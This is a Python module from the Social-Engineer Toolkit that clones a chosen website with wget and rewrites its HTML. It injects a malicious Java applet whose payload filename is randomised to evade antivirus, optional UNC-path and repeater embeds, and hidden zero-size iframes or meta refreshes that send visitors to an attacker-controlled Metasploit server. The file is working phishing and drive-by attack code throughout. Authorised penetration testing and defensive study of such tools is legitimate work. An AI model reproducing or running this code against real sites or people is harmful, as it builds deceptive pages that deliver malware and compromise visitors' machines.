#!/usr/bin/env python
#########################################################################
# This file clones a website for SET to use in conjunction with the java
# applet attack.
#########################################################################
import subprocess
import os
import sys
import time
import re
from src.core.setcore import *
import shutil

operating_system = check_os()
definepath=os.getcwd()

from config.set_config import USER_AGENT_STRING as user_agent
from config.set_config import WEB_PORT as web_port
from config.set_config import JAVA_ID_PARAM as java_id
from config.set_config import JAVA_REPEATER as java_repeater  #Boolean
from config.set_config import JAVA_TIME as java_time
from config.set_config import METASPLOIT_IFRAME_PORT as metasploit_iframe
from config.set_config import AUTO_REDIRECT as auto_redirect  #Boolean
from config.set_config import UNC_EMBED as unc_embed          #Boolean

## Open the IPADDR file
if not os.path.isfile("src/program_junk/interface"):
    fileopen=file("src/program_junk/ipaddr.file","r").readlines()
    for line in fileopen:
        line=line.rstrip()
        ipaddr=line

## Define base value
site_cloned = True

## grab interface ip address
if os.path.isfile("src/program_junk/interface"):
    fileopen=file("src/program_junk/interface", "r").readlines()
    for line in fileopen:
        line=line.rstrip()
        ipaddr=line

## GRAB DEFAULT PORT FOR WEB SERVER
meterpreter_iframe="8080"

## make dir if needed
if not os.path.isdir("src/program_junk/web_clone/"):
        os.makedirs("src/program_junk/web_clone")

## if we used a proxy configuration from the set-proxy
if os.path.isfile("src/program_junk/proxy.confg"):

    fileopen=file("src/program_junk/proxy.config", "r")
    proxy_config = fileopen.read().rstrip()

## just do a ls
if not os.path.isfile("src/program_junk/proxy.confg"): proxy_config = "ls"

## if counter == 0: web_port=80

webdav_meta=0
## see if exploit requires webdav
try:
    fileopen=file("src/program_junk/meta_config", "r")
    for line in fileopen:
        line=line.rstrip()
        match=re.search("set SRVPORT 80", line)
        if match:
            match2=re.search("set SRVPORT %s" % (metasploit_iframe), line)
            if not match2:
                webdav_meta=80
except:
    pass

template=""
## Grab custom or set defined
fileopen=file("src/program_junk/site.template","r").readlines()
for line in fileopen:
    line=line.rstrip()
    match=re.search("TEMPLATE=", line)
    if match:
        line=line.split("=")
        template=line[1]

## grab attack_vector specification
attack_vector=""
if os.path.isfile("src/program_junk/attack_vector"):
    fileopen=file("src/program_junk/attack_vector", "r").readlines()
    for line in fileopen:
        attack_vector=line.rstrip()

# Sticking it to A/V below
import string,random
def random_string(minlength=6,maxlength=15):
    length=random.randint(minlength,maxlength)
    letters=string.ascii_letters+string.digits
    return ''.join([random.choice(letters) for _ in range(length)])
rand_gen=random_string() #+".exe"

try:
    ## open our config file that was specified in SET
    fileopen=file("src/program_junk/site.template", "r").readlines()
    ## start loop here
    url_counter=0
    for line in fileopen:
        line=line.rstrip()
        ## look for config file and parse for URL
        match=re.search("URL=",line)
        if match:
        ## replace the URL designator with nothing
            line=line.replace("URL=","")
            ## define url to clone here
            url=line.rstrip()

    ## if we aren't using multi attack with templates do this
    if url != "NULL":
        if template !="SET":
            print bcolors.YELLOW + "\n[*] Cloning the website: "+(url)
            print "[*] This could take a little bit..." + bcolors.ENDC

    ## wget for now, will eventually convert to urllib2
    ## wget -c -r -k -U Mozilla www.website.com
    if template != "SELF":
        ## clean up old stuff
        ## set counter
        counter=0
        ## see if its osx
        if operating_system == "posix":
            process=subprocess.Popen("uname -a", shell=True, stdout=subprocess.PIPE)
            output=process.communicate()[0]
            match=re.search("Darwin", output)

            if os.path.isfile("/usr/local/bin/wget"):
                counter=2

            if os.path.isfile("/usr/local/wget"):
                counter=2

            if os.path.isfile("/usr/bin/wget"):
                counter=2

            ## if OSX
            if match:
                counter=1
                if os.path.isfile("/usr/local/bin/wget"):
                    counter=2
                if os.path.isfile("/usr/bin/wget"):
                    counter=2
                if os.path.isfile("/usr/local/wget"):
                    counter=2

        ## if we are running windows 
        if operating_system == "windows":
                counter = 3
        

        ## if Linux
        if counter == 0:
            subprocess.Popen('%s;cd src/program_junk/web_clone/;../../webattack/web_clone/linux/wget --no-check-certificate -O index.html -c -k -U "%s" %s' % (proxy_config,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

        ## if OSX
        if counter == 1:
            subprocess.Popen('%s;cd src/program_junk/web_clone/;../../webattack/web_clone/osx/wget --no-check-certificate -O index.html -c -k -U "%s" %s' % (proxy_config,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

        ## if wget is already there
        if counter == 2:
            subprocess.Popen('%s;cd src/program_junk/web_clone/;wget --no-check-certificate -O index.html -c -k -U "%s" %s;' % (proxy_config,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

        ## if we are running windows
        if counter == 3:
            if not os.path.isdir("src/program_junk/web_clone"): os.makedirs("src/program_junk/web_clone")
            if not os.path.isfile("src/program_junk/web_clone/wget.exe"):
                shutil.copyfile("src/webattack/web_clone/win/wget.binary", "src/program_junk/web_clone/wget.exe")
            os.chdir("src/program_junk/web_clone")         
            subprocess.Popen('wget.exe --no-check-certificate -c -k -O index.html -U "%s" %s' % (user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            os.chdir(definepath)
            

        if operating_system == "posix":
            ## if no folder for index.html, rename one
            subprocess.Popen("mv src/program_junk/web_clone/* src/program_junk/web_clone/index.html;mkdir src/program_junk/web_clone/;mv src/program_junk/web_clone/* src/program_junk/web_clone/", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            ## rename the folder to template
            subprocess.Popen("mv src/program_junk/web_clone/* src/program_junk/web_clone/", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

        site_cloned = True

        ## If the website did not clone properly, exit out.

        if not os.path.isfile("src/program_junk/web_clone/index.html"):
            print bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC
            return_continue()
            site_cloned = False
            ## add file to let set interactive shell know it was unsuccessful
            filewrite=file("src/program_junk/cloner.failed" , "w")
            filewrite.write("failed")
            filewrite.close()

	if os.path.isfile("src/program_junk/web_clone/index.html"):
		fileopen = file("src/program_junk/web_clone/index.html", "r")
		counter = 0
		for line in fileopen:
			counter = counter + 1
		if counter == 1 or counter == 0:
			print bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC
			return_continue()
			site_cloned = False
			os.remove("src/program_junk/web_clone/index.html")

	                ## add file to let set interactive shell know it was unsuccessful
        	        filewrite=file("src/program_junk/cloner.failed" , "w")
            		filewrite.write("failed")
            		filewrite.close()

        if site_cloned == True:

            ## make a backup of the site if needed
            shutil.copyfile("src/program_junk/web_clone/index.html", "src/program_junk/web_clone/index.html.bak")


    if site_cloned == True:

        ## java applet attack vector

        ## check for java flag for multi attack
        multi_java=False
        if os.path.isfile("src/program_junk/multi_java"):
            multi_java=True

        if attack_vector == "java" or multi_java:
                ## Here we parse through the new website and add our java applet code, its a hack for now
                ## Wrote this on the plane to Russia, easiest way to do this without internet access :P
                print bcolors.RED + "[*] Injecting Java Applet attack into the newly cloned website." + bcolors.ENDC
                ## Read in newly created index.html
                time.sleep(2)
                if not os.path.isfile("src/program_junk/web_clone/index.html"):
                        ## trigger error that we were unable to grab the website :(
                        print_error("Unable to clone the website it appears. Email us to fix.")
                        sys.exit()

                fileopen=file("src/program_junk/web_clone/index.html","r")
                ## Read add-on for java applet
                fileopen2=file("src/webattack/web_clone/applet.database" , "r")
                ## Write to new file with java applet added
                filewrite=file("src/program_junk/web_clone/index.html.new", "w")
                fileopen3=file("src/webattack/web_clone/repeater.database", "r")
                ## Open the UNC EMBED
                fileopen4=file("src/webattack/web_clone/unc.database", "r")

                ## this is our cloned website 
                index_database = fileopen.read()
                ## this is our applet database
                applet_database = fileopen2.read()
                ## this is our repeater database
                repeater_database = fileopen3.read()
                ## this is our unc database
                unc_database = fileopen4.read()

                ## here we begin replacing specifics in order to prep java applet payload
                applet_database = applet_database.replace("msf.exe", rand_gen)
                quickwrite = file("src/program_junk/rand_gen", "w")
                quickwrite.write(rand_gen)
                ## close the file up
                quickwrite.close()       
                applet_database = applet_database.replace("ipaddrhere", ipaddr + ":" + str(web_port))

                ## set the java field 
                applet_database = applet_database.replace("IDREPLACEHERE", java_id)

                ## set up everything for the unc path
                if unc_embed:
                        unc_database = unc_database.replace("IPREPLACEHERE", ipaddr)
                        unc_database = unc_database.replace("RANDOMNAME", rand_gen)

                ## set up the java repeater
                if java_repeater:
                        repeater_database = repeater_database.replace("IDREPLACEHERE", java_id)
                        repeater_database = repeater_database.replace("TIMEHEREPLZ", java_time)
                        repeater_database = repeater_database.replace("URLHEREPLZ", url)


                ## do a quick sanity check and make sure body is standard
                index_database = re.sub("</BODY.*?>", "</body>", index_database)
                index_database = re.sub("<HEAD.*?>", "<head>", index_database)
                ## start appending and prepping the index file
                if java_repeater:
                        match = re.search("</body.*?>", index_database)
                        if match:
                                index_database = re.sub("</body.*?>", repeater_database + "\n</body>", index_database)
                        if not match:
                                index_database = re.sub("<head.*?>", "\n<head>" + repeater_database, index_database)

                if unc_embed:
                        match = re.search("</body.*?>", index_database)
                        if match:
                                index_database = re.sub("</body.*?>", unc_database + "\n</body>", index_database)
                        if not match:
                                index_database = re.sub("<head.*?>", "\n<head>" + unc_database, index_database)

                counter = 0
                ## confirm we can find body
                match = re.search("</body.*?>", index_database)
                if match:
                        counter = 1
                        index_database = re.sub("</body.*?>", applet_database + "\n</body>", index_database)
                        ##check_redirect = check_config("AUTO_REDIRECT=")
                        if auto_redirect:
                                index_database = index_database.replace('<param name="nextPage" value=""', '<param name="nextPage" value="%s"' % (url))
                if not match:
                        match = re.search("<head.*?>", index_database)
                        if match:
                                counter = 1
                                index_database = re.sub("<head.*?>", "\n<head>" + applet_database, index_database)
                                ##check_redirect = check_config("AUTO_REDIRECT=")
                                if auto_redirect:
                                        index_database = index_database.replace('<param name="nextPage" value=""', '<param name="nextPage" value="%s"' % (url))

                ## start appending and prepping the index file
                if java_repeater:
                        match = re.search("</body.*?>", index_database)
                        if match:
                                index_database = re.sub("</body.*?>", repeater_database + "\n</body>", index_database)
                        if not match:
                                index_database = re.sub("<head.*?>", "\n<head>" + repeater_database, index_database)


                        if counter == 0:
                                print_error("Unable to clone the website...Sorry.")
                                print_error("This is usally caused by a missing body tag on a website.")
                                print_error("Try a diferent site and attempt it again.")                
                                sys.exit(1)               

                ## write the file out
                filewrite.write(index_database)

                ## close the file after done writing
                filewrite.close()

                print bcolors.BLUE + "[*] Filename obfuscation complete. Payload name is: " + rand_gen + "\n[*] Malicious java applet website prepped for deployment\n" + bcolors.ENDC

        ## selection of browser exploits
        ## check to see if multiattack is in use
        multi_meta="off"
        if os.path.isfile("src/program_junk/multi_meta"):
            multi_meta="on"

        if attack_vector == "browser" or multi_meta=="on":
            print bcolors.RED + "[*] Injecting iframes into cloned website for MSF Attack...." + bcolors.ENDC
            ## Read in newly created index.html
            if attack_vector == "multiattack":
                if os.path.isfile("src/program_junk/web_clone/index.html"): os.remove("src/program_junk/web_clone/index.html")
                shutil.copyfile("src/program_junk/web_clone/index.html.new", "src/program_junk/web_clone/index.html")
                time.sleep(1)
            fileopen=file("src/program_junk/web_clone/index.html","r").readlines()
            filewrite=file("src/program_junk/web_clone/index.html.new", "w")
            counter=0
            for line in fileopen:
                counter=0
                if attack_vector == "browser":
                    match=re.search("Signed_Update.jar", line)
                    if match:
                        line=line.replace("Signed_Update.jar", "invalid.jar")
                        filewrite.write(line)
                        counter=1

                match=re.search("<head.*?>", line, flags=re.IGNORECASE)
                if match:
                    header=match.group(0)

                match2=re.search("<head.*?>", line, flags=re.IGNORECASE)
                if match2:
                    header=match.group(0)
                    if webdav_meta != 80:
                        line=line.replace(header, header+'<iframe src ="http://%s:%s/" width="0" height="0" scrolling="no"></iframe>' % (ipaddr,metasploit_iframe))
                        filewrite.write(line)
                        counter=1
                    if webdav_meta == 80:
                        line=line.replace(header, header+'<head><meta HTTP-EQUIV="REFRESH" content="4; url=http://%s">' % (ipaddr))
                if counter == 0: filewrite.write(line)

            try: filewrite.close()
            except: pass
            print bcolors.BLUE + "[*] Malicious iframe injection successful...crafting payload.\n" + bcolors.ENDC


        if attack_vector == "java" or attack_vector == "browser" or attack_vector == "multiattack":
            if not os.path.isfile("src/program_junk/web_clone/Signed_Update.jar"):
                shutil.copyfile("src/html/Signed_Update.jar.orig", "src/program_junk/web_clone/Signed_Update.jar")
            ## move index.html to our main website
            if os.path.isfile("src/program_junk/web_clone/index.html.new"):
                shutil.move("src/program_junk/web_clone/index.html.new", "src/program_junk/web_clone/index.html")

## catch keyboard control-c
except KeyboardInterrupt:
    print ("Control-C detected, exiting gracefully...\n")
    exit_set()
